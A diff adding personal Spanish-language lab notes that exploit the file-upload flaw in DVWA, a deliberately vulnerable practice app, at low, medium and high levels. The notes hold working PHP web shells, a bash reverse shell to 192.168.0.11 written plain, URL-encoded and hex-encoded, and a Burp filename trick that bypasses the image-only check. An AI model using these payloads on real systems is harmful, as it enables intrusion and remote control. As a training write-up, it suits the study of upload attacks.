@@ -1,0 +1,107 @@
+"file upload en dwva "LOW" NIVEL FACIL"
+1=alzamos una imagen png en el servidor vulnerable
+/home/josema96/Descargas/alas.webp
+/home/josema96/Descargas/prrito.jpeg
+
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/prrito.jpeg succesfully uploaded     #retroceder dos directory atras
+http://localhost:1337/hackable/uploads/prrito.jpeg
+
+2=file upload .txt
+/home/josema96/Descargas/test.txt
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/test.txt succesfully uploaded
+http://localhost:1337/hackable/uploads/test.txt
+hola te hikiamos
+
+3=file shell.php
+<?php
+// imprime el nombre de usuario que tiene control del proceso php/httpd activo
+// (en un sistema con el ejecutable "whoami" disponible en la ruta)
+echo exec('whoami');
+?>
+/home/josema96/Descargas/shell.php
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/shell.php succesfully uploaded
+http://localhost:1337/hackable/uploads/shell.php
+www-data
+#otra forma de hacer
+<?php
+        // The page we wish to display
+        system($_GET[ "cmd" ]);
+?>;
+ /home/josema96/Descargas/shell2.php
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/shell2.php succesfully uploaded
+http://localhost:1337/hackable/uploads/shell2.php?cmd=whoami
+www-data
+#Ganemos accesos al sistema
+http://localhost:1337/hackable/uploads/shell2.php?cmd=bash -c "/bin/bash -i >& /dev/tcp/192.168.0.11/1234 0>&1"
+encode 
+http://localhost:1337/hackable/uploads/shell2.php?cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.11%2F1234%200%3E%261%22
+encode2
+http://localhost:1337/hackable/uploads/shell2.php?cmd=
+%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%30%2e%31%31%2f%31%32%33%34%20%30%3e%26%31%22
+
+###########################################################################################
+
+
+"file upload en dwva "MEDIUM" NIVEL MEDIO"
+1= file upload .txt
+/home/josema96/Descargas/test.txt
+http://localhost:1337/vulnerabilities/upload/#
+Your image was not uploaded. We can only accept JPEG or PNG images. ====> solo acepta imagen JPEG or PNG
+1.1=file upload .jpeg
+/home/josema96/Descargas/prrito.jpeg
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/prrito.jpeg succesfully uploaded!
+
+2=file upload shell.php
+/home/josema96/Descargas/shell3.php
+http://localhost:1337/vulnerabilities/upload/#
+Your image was not uploaded. We can only accept JPEG or PNG images. ====> solo acepta imagen JPEG or PNG
+
+2.1=file upload shell.php.png renombrar el file shell.php a shell.php.png
+/home/josema96/Descargas/shell3.php.png
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/shell4.php.png succesfully uploaded!
+http://localhost:1337/hackable/uploads/shell4.php.png
+no muestra nada con "burp suite" quitamos la extension .png
+Content-Disposition: form-data; name="uploaded"; filename="shell4.php.php"
+Content-Disposition: form-data; name="uploaded"; filename="shell4.php"
+../../hackable/uploads/shell4.php succesfully uploaded!
+
+http://localhost:1337/hackable/uploads/shell4.php?cmd=whoami
+www-data
+#Ganamos acceso al sistema
+http://localhost:1337/hackable/uploads/shell4.php?cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.11%2F1234%200%3E%261%22
+
+
+3=====>"file upload en dwva "HIGH" NIVEL DIFICIL"
+/home/josema96/Descargas/prrito.jpeg
+http://localhost:1337/vulnerabilities/upload/#
+../../hackable/uploads/prrito.jpeg succesfully uploaded!
+http://localhost:1337/hackable/uploads/prrito.jpeg 
+
+3.1======> intentamos subir fle upload shell3.php
+/home/josema96/Descargas/shell3.php
+http://localhost:1337/vulnerabilities/upload/#
+Your image was not uploaded. We can only accept JPEG or PNG images.
+
+3.2====> no acepta shell.php intentamos cabiar el shell4.php a shell4.php.png
+http://localhost:1337/vulnerabilities/upload/#
+Your image was not uploaded. We can only accept JPEG or PNG images.
+
+3.4=====> no acpta nuevamente
+
+
+Content-Disposition: form-data; name="uploaded"; filename="hola1.php"
+Content-Type: image/png
+
+http://localhost:1337/vulnerabilities/upload/#
+
+
+
+
+
+
